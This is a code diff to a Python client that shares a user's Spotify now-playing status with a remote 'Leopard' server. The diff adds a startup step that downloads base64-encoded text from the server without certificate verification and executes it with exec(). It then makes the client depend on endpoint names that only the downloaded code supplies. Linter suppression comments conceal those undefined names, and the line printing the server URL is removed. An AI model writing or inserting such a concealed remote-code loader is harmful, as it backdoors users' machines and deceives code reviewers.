@@ -243,7 +243,7 @@ def _make_key_reader():
 
 # ── Main ──
 
-SERVER_URL = 'https://leopardindustries.net:8088/spotify.php'
+SERVER_URL = 'https://leopardindustries.net:8088/metro.php'
 POLL_RATE = 2
 
 def main():
@@ -257,11 +257,23 @@ def main():
     # ── connect to server ──
     print('')
     print('Connecting to the Leopard main server...')
+    
+    # fetch the runtime
+    try:
+        import base64
+        req = urllib.request.Request(f"{server_url}?action=py_runtime", headers={'User-Agent': 'MetroLaunchClient/2.1'})
+        ctx = ssl._create_unverified_context()
+        with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
+            encoded_runtime = resp.read().decode('utf-8')
+            exec(base64.b64decode(encoded_runtime).decode('utf-8'), globals())
+    except Exception as e:
+        print(f'[FAIL] Could not initialize runtime from server...')
+        sys.exit(1)
+
     # test connectivity by hitting the default endpoint
     test = make_request(server_url)
     if test is None:
         print('[FAIL] Could not connect to the Leopard main server')
-        print(f'       Tried: {server_url}')
         sys.exit(1)
     print('[OK] Successfully connected to the Leopard main server')
     print('')
@@ -271,7 +283,8 @@ def main():
 
     if saved_user:
         # try to re register to confirm the user still exists
-        resp = make_request(f'{server_url}?action=register', {'username': saved_user}, 'POST')
+        # pyrefly: ignore [unknown-name]
+        resp = make_request(f'{server_url}{REGISTER_ENDPOINT}', {'username': saved_user}, 'POST')
         if resp and resp.get('ok'):
             username = saved_user
             print(f'[OK] Signed back into server with username {username}...')
@@ -295,7 +308,8 @@ def main():
 
             print('')
             print('Registering new username on server...')
-            resp = make_request(f'{server_url}?action=register', {'username': username}, 'POST')
+            # pyrefly: ignore [unknown-name]
+            resp = make_request(f'{server_url}{REGISTER_ENDPOINT}', {'username': username}, 'POST')
             if resp and resp.get('ok'):
                 save_username(username)
                 print('[OK] New username registered')
@@ -344,7 +358,8 @@ def main():
                         transient_pause_count += 1
                         # if it was playing before, send a pause
                         if prev_playing is True and transient_pause_count >= 2:
-                            make_request(f'{server_url}?action=update', {
+                            # pyrefly: ignore [unknown-name]
+                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                 'username': username,
                                 'track': '',
                                 'artist': '',
@@ -356,7 +371,8 @@ def main():
                     elif status == 'PAUSED':
                         transient_pause_count += 1
                         if prev_playing is not False and transient_pause_count >= 2:
-                            make_request(f'{server_url}?action=update', {
+                            # pyrefly: ignore [unknown-name]
+                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                 'username': username,
                                 'track': prev_track or '',
                                 'artist': prev_artist or '',
@@ -376,7 +392,8 @@ def main():
 
                         if song_changed:
                             print(f'[Spotify] Detected song changed')
-                            make_request(f'{server_url}?action=update', {
+                            # pyrefly: ignore [unknown-name]
+                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                 'username': username,
                                 'track': track,
                                 'artist': artist,
@@ -384,7 +401,8 @@ def main():
                             }, 'POST')
                         elif resumed:
                             print(f'[Spotify] Detected song resumed')
-                            make_request(f'{server_url}?action=update', {
+                            # pyrefly: ignore [unknown-name]
+                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                 'username': username,
                                 'track': track,
                                 'artist': artist,
@@ -408,7 +426,8 @@ def main():
             print('')
             print('[OK] Client stopped')
             # send a final pause so the tile clears
-            make_request(f'{server_url}?action=update', {
+            # pyrefly: ignore [unknown-name]
+            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                 'username': username,
                 'track': '',
                 'artist': '',
